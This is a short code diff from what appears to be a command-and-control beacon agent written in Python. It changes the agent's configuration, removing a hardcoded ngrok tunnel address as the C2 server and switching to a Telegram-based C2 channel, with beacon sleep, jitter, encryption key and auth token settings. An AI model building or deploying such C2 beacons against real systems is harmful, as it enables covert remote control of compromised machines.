@@ -26,9 +26,10 @@ except ImportError:
     _resource_monitor_loaded = False
 
 # ─── Configuration ─────────────────────────────────────────────────────────────
-C2_URL   = os.environ.get("C2_URL",    "https://lynelle-scroddled-corinne.ngrok-free.dev")
-SLEEP    = int(os.environ.get("SLEEP",  "3"))  # Faster beacon for better tracking
-JITTER   = int(os.environ.get("JITTER", "5"))   # Lower jitter
+# Telegram C2 works directly - no public URL needed
+C2_URL   = os.environ.get("C2_URL", "")  # Empty = Telegram C2 mode
+SLEEP    = int(os.environ.get("SLEEP",  "3"))
+JITTER   = int(os.environ.get("JITTER", "5"))
 ENC_KEY  = os.environ.get("ENC_KEY",   "")
 AUTH_TOKEN = os.environ.get("AUTH_TOKEN", "")
 DEBUG    = os.environ.get("C2_DEBUG",  "1")  # Enable debug by default
